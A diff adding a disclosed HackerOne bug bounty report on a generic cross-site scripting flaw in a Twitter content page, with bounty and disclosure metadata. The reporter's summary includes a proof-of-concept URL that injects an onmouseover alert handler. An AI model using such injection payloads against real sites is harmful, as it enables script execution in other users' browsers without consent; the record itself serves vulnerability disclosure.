@@ -1,0 +1,17 @@
+ReportLink:https://hackerone.com/reports/33091
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/avram
+ReportedTo:Twitter(twitter)
+BountyAmount:1400.0
+Severity:
+State:Closed
+DateOfDisclosure:03.12.2014 23:28:19
+
+Summary:
+
+ 
+Hi, for me works on Firefox 32, tested on Mac OS X Mavericks and Windows 7
+
+https://content.twitter.com/small-business-guide/# onmouseover=alert('XSS')  
+
+Regards
